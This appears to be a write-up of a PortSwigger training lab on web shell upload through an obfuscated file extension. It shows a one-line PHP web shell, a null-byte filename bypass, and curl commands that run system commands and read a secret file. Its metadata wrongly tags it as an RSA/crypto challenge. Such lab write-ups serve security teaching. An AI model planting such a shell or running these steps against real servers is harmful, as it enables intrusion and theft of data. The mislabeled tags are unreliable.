---
title: "fuv 5 - portswigger labs"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "wiener", "fuv", "rsa", "cryptography", "fuv-5"]
summary: "crypto writeup for \"fuv 5\" from portswigger labs - techniques: wiener, fuv, rsa, cryptography, fuv-5."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-5/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-5/README.md"
ctf:
  name: "portswigger labs"
  challenge: "fuv 5"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** fuv 5
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-5/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-5/README.md>

---
# Web shell upload via obfuscated file extension | Dec 16, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension), you'll learn: Web shell upload via obfuscated file extension! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216023847.png)

**Login as user `wiener`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216023859.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216023906.png)

In previous labs, we found the image upload function is vulnerable.

**We can try to upload a PHP web shell:**
```php
<?php system($_GET['cmd']); ?>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216024234.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216024251.png)

**However, it rejects because we're not uploading a jpg or png file.**

**To bypass this, we can rename our web shell file to `webshell.php.jpg`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216024416.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216024425.png)

We successfully uploaded the PHP web shell!

**Let's verify does it work or not:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities]
└─# curl https://0a7200ad036e3545c4780f4d007600f9.web-security-academy.net/files/avatars/webshell.php.jpg --get --data-urlencode "cmd=cat /home/carlos/secret"
<?php system($_GET['cmd']); ?>
```

Nope.

**How about using a null byte(`%00`) and append the `.jpg` extension?**

By doing that, the null byte will cancel out the `.jpg` extension.

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-5/images/Pasted%20image%2020221216024839.png)

**File uploaded, does it work?**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities]
└─# curl https://0a7200ad036e3545c4780f4d007600f9.web-security-academy.net/files/avatars/webshell.php --get --data-urlencode "cmd=id"                     
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

**It worked! Let's `cat` the `secret` file!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities]
└─# curl https://0a7200ad036e3545c4780f4d007600f9.web-security-academy.net/files/avatars/webshell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
FFNCTnwaWTITzEr6MKrDhRN5FfTAS3XV
```

# What we've learned:

1. Web shell upload via obfuscated file extension
